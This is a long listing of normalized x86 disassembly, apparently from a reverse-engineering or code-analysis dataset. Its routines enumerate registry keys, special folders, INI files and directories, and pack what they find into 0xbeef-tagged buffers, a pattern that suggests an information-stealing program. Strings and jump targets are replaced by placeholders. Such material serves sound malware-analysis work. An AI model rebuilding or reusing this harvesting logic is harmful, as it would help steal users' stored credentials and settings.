call GetProcAddress
or eax eax
je r-xdata
add [ ebp - 0xa8 ] 0x4
push [ ebp - 0xa8 ]
push [ ebp + 0x8 ]
call sub_4014e6
sub [ ebp - 0xa8 ] 0x4
push 0xffffffff
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0xa8 ]
push [ ebp - 0xac ]
push [ ebp + 0x8 ]
call sub_4014fb
jmp r-xdata
push 0x24
lea eax [ ebp - 0xd0 ]
push eax
push [ ebp + 0x8 ]
call sub_40151c
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
pop ebx
leave
retn 0x4
lea eax [ ebp - 0xd0 ]
push eax
call GetSystemInfo
lea edx [ ebp - 0xd0 ]
push edx
call eax
inc ebx
push [ ebp - 0xac ]
call sub_401835
push [ ebp - 0xa4 ]
call sub_401835
sub ebx ebx
push rw-data
call GetModuleHandleA
mov [ ebp - 0xd4 ] eax
cmp [ ebp - 0xd4 ] 0x0
je r-xdata
sub_4045d2
push ebp
mov ebp esp
add esp 0xfffff7e8
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ rw-data ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0x8
mov [ ebp - 0x8 ] 0x0
cmp [ ebp - 0x814 ] 0x1
je r-xdata
jmp r-xdata
push rw-data
lea eax [ ebp - 0x80c ]
push eax
call StrStrIA
or eax eax
je r-xdata
cmp [ ebp - 0x814 ] 0x7
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
inc [ ebp - 0x8 ]
jmp r-xdata
lea eax [ ebp - 0x818 ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp + 0xc ]
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
inc [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
lea eax [ ebp - 0x814 ]
push eax
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumValueA
or eax eax
je r-xdata
mov [ ebp - 0x810 ] eax
push 0xbeef0001
push [ ebp + 0x8 ]
call sub_4014e6
cmp [ ebp - 0x814 ] 0x1
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_4014e6
push 0x0
push [ ebp + 0x8 ]
call sub_4014e6
jmp r-xdata
push [ ebp - 0x818 ]
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_40151c
push [ ebp - 0x810 ]
call sub_401835
sub_4046e0
push ebp
mov ebp esp
add esp 0xfffff7e4
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ rw-data ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0x8
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x810 ] eax
call sub_401835
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x81c ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x810 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x818 ] eax
cmp [ ebp - 0x81c ] 0x0
je r-xdata
jmp r-xdata
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_4046e0
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x814 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
cmp [ ebp - 0x818 ] 0x0
je r-xdata
push 0xbeef0000
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x814 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x81c ]
push [ ebp + 0x8 ]
call sub_401548
sub_40485a
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_4046e0
push rw-data
push [ ebp + 0x8 ]
call sub_4046e0
push rw-data
push [ ebp + 0x8 ]
call sub_4046e0
push rw-data
push [ ebp + 0x8 ]
call sub_4045d2
push rw-data
push [ ebp + 0x8 ]
call sub_4045d2
push rw-data
push [ ebp + 0x8 ]
call sub_4045d2
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_4048e3
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
leave
retn 0x8
push [ ebp + 0xc ]
call sub_402526
or eax eax
jne r-xdata
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_401dc9
mov [ ebp + 0xc ] eax
push 0x0
push rw-data
push rw-data
push 0x80000002
call sub_401cee
or eax eax
je r-xdata
push eax
push eax
push [ ebp + 0xc ]
call sub_401d75
push eax
push eax
push [ ebp + 0x8 ]
call sub_4048cc
call sub_401835
call sub_401835
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push eax
push eax
push [ ebp + 0xc ]
call sub_401d75
push eax
push eax
push [ ebp + 0x8 ]
call sub_4048cc
call sub_401835
call sub_401835
push 0x0
push rw-data
push rw-data
push 0x80000002
call sub_401cee
or eax eax
je r-xdata
push eax
push eax
push [ ebp + 0xc ]
call sub_401d75
push eax
push eax
push [ ebp + 0x8 ]
call sub_4048cc
call sub_401835
call sub_401835
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push eax
push eax
push [ ebp + 0x8 ]
call sub_4048cc
call sub_401835
push [ ebp + 0xc ]
call sub_401835
push eax
push eax
push [ ebp + 0xc ]
call sub_401d75
push eax
push eax
push [ ebp + 0x8 ]
call sub_4048cc
call sub_401835
call sub_401835
sub_404a16
push ebp
mov ebp esp
add esp 0xfffffff4
push 0x0
push 0x2
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x105
call sub_40184c
mov [ ebp - 0x8 ] eax
push 0x104
push [ ebp - 0x8 ]
call GetWindowsDirectoryA
or eax eax
je r-xdata
push [ ebp - 0x8 ]
call sub_401835
cmp eax 0x104
ja r-xdata
push 0x23
call sub_401e2e
or eax eax
je r-xdata
push rw-data
push eax
call sub_401dc9
push eax
push [ ebp + 0x8 ]
call sub_4048e3
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_4048e3
jmp r-xdata
push 0x1c
call sub_401e2e
or eax eax
je r-xdata
push rw-data
push eax
call sub_401dc9
push eax
push [ ebp + 0x8 ]
call sub_4048e3
push 0x28
call sub_401e2e
push eax
push [ ebp + 0x8 ]
call sub_4048e3
push 0x1a
call sub_401e2e
or eax eax
je r-xdata
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
push eax
push [ ebp + 0x8 ]
call sub_4048e3
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push rw-data
push eax
call sub_401dc9
push eax
push [ ebp + 0x8 ]
call sub_4048e3
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
push eax
push [ ebp + 0x8 ]
call sub_4048e3
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
mov [ ebp - 0xc ] eax
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call sub_4048cc
push [ ebp - 0xc ]
call sub_401835
push 0x0
push rw-data
push rw-data
push 0x80000002
call sub_401cee
push eax
push [ ebp + 0x8 ]
call sub_4048e3
push 0x0
push rw-data
push rw-data
push 0x80000002
call sub_401cee
or eax eax
je r-xdata
mov [ ebp - 0xc ] eax
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call sub_4048cc
push [ ebp - 0xc ]
call sub_401835
push 0x0
push rw-data
push rw-data
push 0x80000002
call sub_401cee
push eax
push [ ebp + 0x8 ]
call sub_4048e3
push 0x0
push rw-data
push rw-data
push 0x80000002
call sub_401cee
or eax eax
je r-xdata
mov [ ebp - 0xc ] eax
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call sub_4048cc
push [ ebp - 0xc ]
call sub_401835
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
mov [ ebp - 0xc ] eax
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call sub_4048cc
push [ ebp - 0xc ]
call sub_401835
sub_404c38
push ebp
mov ebp esp
add esp 0xfffffeb4
mov [ ebp - 0x148 ] 0x0
mov eax [ ebp + 0xc ]
or eax eax
je r-xdata
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
push [ ebp - 0x148 ]
call sub_401835
leave
retn 0xc
push [ ebp + 0xc ]
call sub_402526
or eax eax
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push rw-data
push [ ebp + 0xc ]
call sub_401d75
jmp r-xdata
lea edx [ ebp - 0x13e ]
test [ edx ] 0x10
je r-xdata
mov [ ebp - 0x148 ] eax
push 0x13e
lea eax [ ebp - 0x13e ]
push eax
call sub_401863
lea eax [ ebp - 0x13e ]
push eax
push [ ebp - 0x148 ]
call FindFirstFileA
mov [ ebp - 0x144 ] eax
inc eax
je r-xdata
lea eax [ edx + 0x2c ]
mov [ ebp - 0x14c ] eax
push rw-data
push [ ebp - 0x14c ]
call StrStrIA
or eax eax
je r-xdata
lea eax [ edx + 0x2c ]
push eax
push rw-data
call lstrcmpiA
or eax eax
jne r-xdata
lea eax [ ebp - 0x13e ]
push eax
push [ ebp - 0x144 ]
call FindNextFileA
test eax eax
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push [ ebp - 0x14c ]
push eax
call sub_401dc9
push eax
push eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
lea edx [ ebp - 0x13e ]
lea eax [ edx + 0x2c ]
push eax
push rw-data
call lstrcmpiA
or eax eax
jne r-xdata
jmp r-xdata
push [ ebp - 0x144 ]
call FindClose
mov eax 0x1
push rw-data
push eax
call StrStrIA
jmp r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_401d75
lea edx [ ebp - 0x13e ]
lea edx [ edx + 0x2c ]
push edx
push eax
call sub_401dc9
push eax
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_404c38
call sub_401835
jmp r-xdata
jmp r-xdata
call sub_401835
push edx
push [ ebp + 0x8 ]
call sub_404c21
pop edx
or eax eax
je r-xdata
sub_404dc4
push ebp
mov ebp esp
add esp 0xfffffffc
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
push 0x1
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_404c38
push [ ebp - 0x4 ]
call sub_401835
leave
retn 0xc
mov [ ebp - 0x4 ] eax
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call sub_401d75
push eax
push [ ebp - 0x4 ]
call sub_401835
pop [ ebp - 0x4 ]
sub_404e10
push ebp
mov ebp esp
add esp 0xfffffef0
push 0x0
push 0x3
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x104
lea eax [ ebp - 0x109 ]
push eax
call GetWindowsDirectoryA
or eax eax
je r-xdata
push 0x2b
call sub_401e2e
or eax eax
je r-xdata
cmp eax 0x104
ja r-xdata
push rw-data
push 0x1a
push [ ebp + 0x8 ]
call sub_404dc4
push rw-data
push 0x23
push [ ebp + 0x8 ]
call sub_404dc4
push rw-data
push 0x1c
push [ ebp + 0x8 ]
call sub_404dc4
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
push rw-data
push eax
call sub_401dc9
push eax
push 0x0
push eax
push [ ebp + 0x8 ]
call sub_404c38
call sub_401835
push rw-data
lea eax [ ebp - 0x109 ]
push eax
call sub_401d75
mov [ ebp - 0x110 ] eax
push [ ebp - 0x110 ]
push 0x104
lea eax [ ebp - 0x109 ]
push eax
push rw-data
push rw-data
push rw-data
call GetPrivateProfileStringA
or eax eax
je r-xdata
push [ ebp - 0x110 ]
push 0x104
lea eax [ ebp - 0x109 ]
push eax
push rw-data
push rw-data
push rw-data
call GetPrivateProfileStringA
or eax eax
je r-xdata
push 0x0
lea eax [ ebp - 0x109 ]
push eax
push [ ebp + 0x8 ]
call sub_404c38
push [ ebp - 0x110 ]
call sub_401835
push 0x0
lea eax [ ebp - 0x109 ]
push eax
push [ ebp + 0x8 ]
call sub_404c38
sub_404f5e
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push rw-data
push [ ebp + 0xc ]
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
leave
retn 0x8
mov [ ebp - 0x8 ] eax
push 0xbeef0001
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_403ddc
push [ ebp - 0x8 ]
call sub_401835
sub_404fa8
push ebp
mov ebp esp
add esp 0xfffffeb4
mov [ ebp - 0x148 ] 0x0
mov eax [ ebp + 0xc ]
or eax eax
je r-xdata
jmp r-xdata
cmp [ eax ] 0x0
jne r-xdata
push [ ebp - 0x148 ]
call sub_401835
leave
retn 0xc
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_401d75
push eax
push eax
push [ ebp + 0x8 ]
call sub_404f47
call sub_401835
push rw-data
push [ ebp + 0xc ]
call sub_401d75
mov [ ebp - 0x148 ] eax
push 0x13e
lea eax [ ebp - 0x13e ]
push eax
call sub_401863
lea eax [ ebp - 0x13e ]
push eax
push [ ebp - 0x148 ]
call FindFirstFileA
mov [ ebp - 0x144 ] eax
inc eax
je r-xdata
lea edx [ ebp - 0x13e ]
test [ edx ] 0x10
je r-xdata
lea eax [ ebp - 0x13e ]
push eax
push [ ebp - 0x144 ]
call FindNextFileA
test eax eax
jne r-xdata
lea edx [ ebp - 0x13e ]
lea eax [ edx + 0x2c ]
push eax
push rw-data
call lstrcmpiA
or eax eax
jne r-xdata
push [ ebp - 0x144 ]
call FindClose
lea edx [ ebp - 0x13e ]
lea eax [ edx + 0x2c ]
push eax
push rw-data
call lstrcmpiA
or eax eax
jne r-xdata
jmp r-xdata
lea edx [ ebp - 0x13e ]
lea eax [ edx + 0x2c ]
mov [ ebp - 0x14c ] eax
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push [ ebp - 0x14c ]
push eax
call sub_401dc9
push [ ebp + 0x10 ]
push eax
call sub_401dc9
push eax
push eax
push [ ebp + 0x8 ]
call sub_404f47
call sub_401835
jmp r-xdata
sub_4050df
push ebp
mov ebp esp
add esp 0xfffffffc
push [ ebp + 0xc ]
call sub_401e2e
mov [ ebp - 0x4 ] eax
or eax eax
je r-xdata
leave
retn 0x8
push rw-data
push [ ebp - 0x4 ]
call sub_401d75
push eax
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404fa8
call sub_401835
push rw-data
push [ ebp - 0x4 ]
call sub_401d75
push eax
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404fa8
call sub_401835
push rw-data
push [ ebp - 0x4 ]
call sub_401d75
push eax
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404fa8
call sub_401835
push rw-data
push [ ebp - 0x4 ]
call sub_401d75
push eax
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404fa8
call sub_401835
push [ ebp - 0x4 ]
call sub_401835
sub_405188
push ebp
mov ebp esp
add esp 0xfffffffc
push edi
push 0x0
push 0x4
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push 0x1a
push [ ebp + 0x8 ]
call sub_4050df
push 0x23
push [ ebp + 0x8 ]
call sub_4050df
push 0x1c
push [ ebp + 0x8 ]
call sub_4050df
push 0x26
push [ ebp + 0x8 ]
call sub_4050df
push rw-data
push [ ebp + 0x8 ]
call sub_404f5e
push rw-data
push [ ebp + 0x8 ]
call sub_404f5e
push rw-data
push [ ebp + 0x8 ]
call sub_404f5e
push rw-data
push [ ebp + 0x8 ]
call sub_404f5e
push rw-data
push [ ebp + 0x8 ]
call sub_404f5e
push rw-data
push [ ebp + 0x8 ]
call sub_404f5e
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
push edi
call sub_4023a8
or eax eax
je r-xdata
push eax
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404fa8
call sub_401835
sub_40528d
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_401cee
or eax eax
je r-xdata
leave
retn 0x10
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp - 0x4 ]
call sub_401d75
push 0xbeef0000
push eax
push [ ebp + 0x8 ]
call sub_40526a
push rw-data
push [ ebp - 0x4 ]
call sub_401d75
push 0xbeef0001
push eax
push [ ebp + 0x8 ]
call sub_40526a
push rw-data
push [ ebp - 0x4 ]
call sub_401d75
push 0xbeef0002
push eax
push [ ebp + 0x8 ]
call sub_40526a
push [ ebp - 0x4 ]
call sub_401835
sub_405307
push ebp
mov ebp esp
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push [ ebp + 0x10 ]
push eax
call sub_401dc9
push [ ebp + 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_40526a
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push [ ebp + 0x10 ]
push eax
call sub_401dc9
push [ ebp + 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_40526a
leave
retn 0x10
sub_405352
push ebp
mov ebp esp
add esp 0xfffffffc
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0x8
mov [ ebp - 0x4 ] eax
push 0xbeef0000
push rw-data
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_405307
push 0xbeef0001
push rw-data
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_405307
push 0xbeef0002
push rw-data
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_405307
push [ ebp - 0x4 ]
call sub_401835
sub_4053b2
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x5
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40528d
push rw-data
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40528d
push rw-data
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40528d
push rw-data
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40528d
push rw-data
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40528d
push rw-data
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40528d
push rw-data
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40528d
push rw-data
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40528d
push rw-data
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_40528d
push rw-data
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_40528d
push rw-data
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_40528d
push rw-data
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_40528d
push rw-data
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_40528d
push rw-data
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_40528d
push rw-data
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_40528d
push rw-data
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_40528d
push 0x1a
push [ ebp + 0x8 ]
call sub_405352
push 0x23
push [ ebp + 0x8 ]
call sub_405352
push 0x1c
push [ ebp + 0x8 ]
call sub_405352
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40556c
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
leave
retn 0x8
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push eax
push 0xbeef0000
push eax
push [ ebp + 0x8 ]
call sub_403e31
call sub_401835
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push eax
push 0xbeef0001
push eax
push [ ebp + 0x8 ]
call sub_403e31
call sub_401835
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push eax
push 0xbeef0002
push eax
push [ ebp + 0x8 ]
call sub_403e31
call sub_401835
sub_4055dc
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0x8
push rw-data
push eax
call sub_401dc9
push eax
push eax
push [ ebp + 0x8 ]
call sub_40556c
call sub_401835
sub_405609
push ebp
mov ebp esp
add esp 0xffffffe0
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0xc ] eax
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x4 ] eax
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0xc ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
push [ ebp + 0xc ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x10 ] eax
push 0x0
push [ ebp + 0x20 ]
push [ ebp + 0xc ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x20 ]
push eax
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0xc ]
call sub_401835
push [ ebp - 0x4 ]
call sub_401835
push [ ebp - 0x8 ]
call sub_401835
push [ ebp - 0x10 ]
call sub_401835
push [ ebp - 0x14 ]
call sub_401835
push [ ebp - 0x1c ]
call sub_401835
leave
retn 0x24
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
push [ ebp + 0x28 ]
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call sub_401548
cmp [ ebp + 0x28 ] 0xbeef0013
jne r-xdata
push [ ebp - 0x18 ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call sub_40151c
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call sub_401548
jmp r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4014e6
cmp [ ebp - 0x20 ] 0x4
jne r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_401548
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_4014e6
jmp r-xdata
sub_405769
push ebp
mov ebp esp
add esp 0xfffff7f0
push 0xbeef0013
push rw-data
push rw-data
push rw-data
push rw-data
push rw-data
push rw-data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405609
push 0xbeef0013
push rw-data
push rw-data
push rw-data
push rw-data
push rw-data
push rw-data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405609
push 0xbeef0014
push rw-data
push rw-data
push rw-data
push rw-data
push rw-data
push rw-data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405609
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ rw-data ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0x8
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0xc ]
call sub_401d75
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401dc9
mov [ ebp - 0x810 ] eax
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_405769
push [ ebp - 0x810 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
jmp r-xdata
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
sub_405890
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x6
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_405769
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push eax
push eax
push [ ebp + 0x8 ]
call sub_40556c
call sub_401835
push 0x0
push rw-data
push rw-data
push 0x80000002
call sub_401cee
or eax eax
je r-xdata
push eax
push eax
push [ ebp + 0x8 ]
call sub_40556c
call sub_401835
push 0x0
push rw-data
push rw-data
push 0x80000002
call sub_401cee
or eax eax
je r-xdata
push eax
push eax
push [ ebp + 0x8 ]
call sub_40556c
call sub_401835
push 0x1a
push [ ebp + 0x8 ]
call sub_4055dc
push 0x23
push [ ebp + 0x8 ]
call sub_4055dc
push 0x1c
push [ ebp + 0x8 ]
call sub_4055dc
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
push eax
push eax
push [ ebp + 0x8 ]
call sub_40556c
call sub_401835
sub_405985
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push edi
push 0x0
push 0x7
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
pop esi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
push esi
call sub_4023a8
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
jmp r-xdata
push esi
call sub_4023a8
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
cmp [ esi ] 0x0
jne r-xdata
inc esi
inc esi
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
sub_405a31
push ebp
mov ebp esp
push 0xbeef0000
push rw-data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404116
push 0xbeef0001
push rw-data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404116
leave
retn 0x8
sub_405a62
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0x8
push rw-data
push eax
call sub_401dc9
push eax
push eax
push [ ebp + 0x8 ]
call sub_405a31
call sub_401835
sub_405a8f
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x8
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push eax
push 0xbeef0001
push eax
push [ ebp + 0x8 ]
call sub_403e31
call sub_401835
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push eax
push 0xbeef0001
push eax
push [ ebp + 0x8 ]
call sub_403e31
call sub_401835
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push eax
push eax
push [ ebp + 0x8 ]
call sub_405a31
call sub_401835
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push eax
push eax
push [ ebp + 0x8 ]
call sub_405a31
call sub_401835
push 0x1c
push [ ebp + 0x8 ]
call sub_405a62
push 0x1a
push [ ebp + 0x8 ]
call sub_405a62
push 0x23
push [ ebp + 0x8 ]
call sub_405a62
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
push eax
push eax
push [ ebp + 0x8 ]
call sub_405a31
call sub_401835
sub_405bad
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0x8
push rw-data
push eax
call sub_401dc9
push eax
push eax
push eax
